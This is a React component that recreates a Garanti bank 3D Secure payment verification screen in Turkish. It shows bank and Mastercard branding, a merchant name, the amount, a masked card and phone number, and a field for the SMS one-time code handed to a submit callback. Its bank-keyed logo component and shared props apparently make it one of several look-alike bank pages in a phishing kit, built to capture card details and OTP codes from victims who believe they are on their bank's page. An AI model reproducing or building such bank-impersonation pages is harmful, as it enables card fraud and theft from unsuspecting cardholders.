'use client';

import { useState } from 'react';
import { FiChevronDown } from 'react-icons/fi';
import BankLogo from '@/components/banks/logos/BankLogo';
import {
  formatAmount,
  maskCardGaranti,
  maskPhoneGaranti,
} from './threeDSecureUtils';
import type { BankThreeDSecureProps } from './types';

function MastercardMark() {
  return (
    <div className="flex shrink-0 flex-col items-end leading-none">
      <div className="flex items-center">
        <span className="h-8 w-8 rounded-full bg-[#eb001b]" />
        <span className="-ml-3.5 h-8 w-8 rounded-full bg-[#f79e1b]" />
      </div>
      <span className="mt-1 text-sm font-bold lowercase tracking-tight text-gray-900">mastercard</span>
    </div>
  );
}

export default function GarantiThreeDSecurePage({
  amount,
  cardNumber,
  phoneNumber,
  phoneLast4,
  verificationCode,
  onVerificationCodeChange,
  error,
  loading,
  transactionDate,
  merchantName = 'A101',
  onSubmit,
  onCancel,
}: BankThreeDSecureProps) {
  const formattedAmount = formatAmount(amount);
  const [helpOpen, setHelpOpen] = useState(false);
  const maskedPhone = maskPhoneGaranti(phoneNumber);
  const merchantLabel = merchantName.toUpperCase();

  return (
    <div className="min-h-screen min-h-dvh bg-[#2f6f2f] px-3 py-4 sm:px-4 sm:py-6">
      <div className="mx-auto w-full max-w-[440px] overflow-hidden rounded-sm bg-white shadow-lg">
        <div className="px-5 pb-6 pt-5 sm:px-6 sm:pb-7 sm:pt-6">
          <div className="mb-4 flex items-start justify-between gap-4">
            <BankLogo bankId="garanti" height={40} className="shrink-0" />
            <MastercardMark />
          </div>

          <h1 className="mb-4 text-lg font-normal text-gray-900 sm:text-xl">
            3D Secure Ödeme Doğrulama
          </h1>

          <div className="mb-5 rounded-sm bg-[#2f6f2f] px-4 py-4 text-white sm:px-5 sm:py-5">
            <div className="flex items-start justify-between gap-4">
              <div className="min-w-0 flex-1">
                <p
                  className="truncate text-base font-bold uppercase leading-tight sm:text-lg"
                  title={merchantLabel}
                >
                  {merchantLabel}
                </p>
                <p className="mt-2 text-sm font-normal text-white/95 sm:text-[0.9375rem]">
                  {transactionDate}
                </p>
              </div>
              <div className="shrink-0 text-right">
                <p className="text-base font-bold leading-tight sm:text-lg">{formattedAmount} TRY</p>
                <p className="mt-2 font-mono text-sm tracking-wide text-white/95 sm:text-[0.9375rem]">
                  {maskCardGaranti(cardNumber)}
                </p>
              </div>
            </div>
          </div>

          <div className="mb-4">
            <div className="mb-3 flex items-center justify-between rounded-sm border border-gray-300 bg-[#f7f7f7] px-4 py-3">
              <span className="text-sm font-medium text-gray-700">SMS Gönder</span>
              <span className="text-sm font-semibold text-gray-900 sm:text-base">{maskedPhone}</span>
            </div>

            <p className="mb-3 text-sm leading-relaxed text-gray-700">
              Sonu <span className="font-semibold">{phoneLast4 || '****'}</span> ile biten telefon
              numaranıza gönderilen doğrulama şifresini giriniz.
            </p>

            {error && (
              <div className="mb-3 rounded border border-red-200 bg-red-50 px-3 py-2.5 text-center text-sm text-red-600">
                {error}
              </div>
            )}

            <input
              type="password"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={verificationCode}
              onChange={(e) => onVerificationCodeChange(e.target.value.replace(/\D/g, '').slice(0, 6))}
              maxLength={6}
              placeholder="Doğrulama şifresi"
              className="w-full rounded-sm border border-gray-300 px-4 py-3.5 text-base outline-none focus:border-[#00a19a] focus:ring-1 focus:ring-[#00a19a]"
            />
          </div>

          <form onSubmit={onSubmit}>
            <button
              type="submit"
              disabled={loading || verificationCode.length < 4}
              className="w-full rounded-sm bg-[#00a19a] py-4 text-base font-bold text-white transition hover:bg-[#008f88] disabled:bg-gray-300 sm:text-lg"
            >
              {loading ? 'Gönderiliyor...' : 'Devam'}
            </button>
          </form>

          <button
            type="button"
            onClick={() => setHelpOpen((v) => !v)}
            className="mt-4 flex w-full items-center justify-between border-t border-gray-200 py-3.5 text-sm font-medium text-gray-700 sm:text-base"
          >
            Yardım
            <FiChevronDown className={`transition-transform ${helpOpen ? 'rotate-180' : ''}`} />
          </button>

          {helpOpen && (
            <p className="mb-2 px-1 text-sm leading-relaxed text-gray-600">
              Doğrulama kodunuz ulaşmadıysa birkaç dakika bekleyin veya bankanızın müşteri hizmetleri
              ile iletişime geçin.
            </p>
          )}

          <button
            type="button"
            onClick={onCancel}
            className="mt-2 w-full py-2 text-center text-sm font-medium text-gray-600 hover:text-gray-900 sm:text-base"
          >
            İşlemi İptal Et
          </button>
        </div>
      </div>
    </div>
  );
}
